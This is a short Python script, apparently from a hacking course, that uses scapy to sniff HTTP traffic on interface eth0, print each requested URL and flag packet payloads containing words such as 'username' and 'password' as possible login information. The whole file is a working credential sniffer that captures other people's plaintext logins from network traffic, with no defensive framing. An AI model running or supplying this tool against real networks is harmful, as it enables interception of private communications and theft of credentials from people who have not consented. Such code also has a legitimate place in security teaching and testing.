#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "uname", "user", "login", "email", "password", "pword", "pass"]
        for k in keywords:
            if k in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))
        login = get_login(packet)
        if login:
            print("\n\n[+] Possible login info >> " + login + "\n\n")


sniff("eth0")
